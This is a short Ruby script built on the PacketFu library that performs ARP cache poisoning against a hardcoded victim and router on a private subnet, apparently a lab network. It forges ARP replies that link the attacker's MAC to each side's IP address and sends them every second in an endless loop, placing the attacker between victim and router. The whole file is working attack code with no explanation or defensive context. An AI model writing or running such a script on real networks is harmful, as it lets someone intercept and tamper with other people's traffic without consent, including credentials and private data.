#!/usr/bin/env ruby

require 'packetfu'

attacker_mac = "02:42:C0:A8:5A:0C"
victim_ip    = "192.168.100.2"
victim_mac   = "02:42:C0:A8:5A:0B"
router_ip    = "192.168.100.11"
router_mac   = "02:42:C0:A8:5A:0D"

info = PacketFu::Utils.whoami?

# Victim
# Build Ethernet header
arp_packet_victim = PacketFu::ARPPacket.new
arp_packet_victim.eth_saddr = attacker_mac        # attacker MAC address
arp_packet_victim.eth_daddr = victim_mac          # the victim's MAC address
# Build ARP Packet
arp_packet_victim.arp_saddr_mac = attacker_mac    # attacker MAC address
arp_packet_victim.arp_daddr_mac = victim_mac      # the victim's MAC address
arp_packet_victim.arp_saddr_ip = router_ip        # the router's IP
arp_packet_victim.arp_daddr_ip = victim_ip        # the victim's IP
arp_packet_victim.arp_opcode = 2                  # arp code 2 == ARP reply

# Router
# Build Ethernet header
arp_packet_router = PacketFu::ARPPacket.new
arp_packet_router.eth_saddr = attacker_mac        # attacker MAC address
arp_packet_router.eth_daddr = router_mac          # the router's MAC address
# Build ARP Packet
arp_packet_router.arp_saddr_mac = attacker_mac    # attacker MAC address
arp_packet_router.arp_daddr_mac = router_mac      # the router's MAC address
arp_packet_router.arp_saddr_ip = victim_ip        # the victim's IP
arp_packet_router.arp_daddr_ip = router_ip        # the router's IP
arp_packet_router.arp_opcode = 2                  # arp code 2 == ARP reply

while true
    sleep 1
    puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
    arp_packet_victim.to_w(info[:iface])
    puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
    arp_packet_router.to_w(info[:iface])
end